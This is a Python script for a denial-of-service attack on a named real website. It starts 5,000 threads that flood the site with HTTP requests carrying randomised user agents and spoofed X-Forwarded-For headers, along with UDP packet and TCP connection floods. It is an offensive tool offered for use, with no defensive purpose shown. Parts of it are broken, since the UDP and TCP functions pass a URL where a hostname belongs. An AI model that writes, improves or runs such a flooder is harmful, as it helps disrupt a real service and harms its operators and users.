import requests
import threading
import random
import string
import socket
import time

target_url = 'https://ethioprogramming.com'
num_threads = 5000
use_proxies = True

def generate_random_user_agent():
    user_agent = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(20))
    return f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/{user_agent}'

def generate_random_ip():
    return '.'.join(str(random.randint(0, 255)) for _ in range(4))

def send_request():
    while True:
        try:
            headers = {'User-Agent': generate_random_user_agent()}
            if use_proxies:
                proxy = {
                    'http': 'http://user:pass@proxy_ip:proxy_port',
                    'https': 'http://user:pass@proxy_ip:proxy_port'
                }
                response = requests.get(target_url, headers=headers, proxies=proxy)
            else:
                response = requests.get(target_url, headers=headers)
            # You can add code here to process the response or log the result
        except requests.exceptions.RequestException:
            pass

def send_udp_attack():
    while True:
        try:
            udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            udp_socket.sendto(b'', (target_url, random.randint(1, 65535)))
        except:
            pass

def send_tcp_attack():
    while True:
        try:
            tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcp_socket.connect((target_url, 80))
        except:
            pass

def send_http_attack():
    while True:
        try:
            headers = {'X-Forwarded-For': generate_random_ip()}
            requests.get(target_url, headers=headers)
        except:
            pass

# Launch the attack
threads = []
for _ in range(num_threads):
    t = threading.Thread(target=random.choice([send_request, send_udp_attack, send_tcp_attack, send_http_attack]))
    t.daemon = True
    threads.append(t)

for t in threads:
    t.start()

for t in threads:
    t.join()
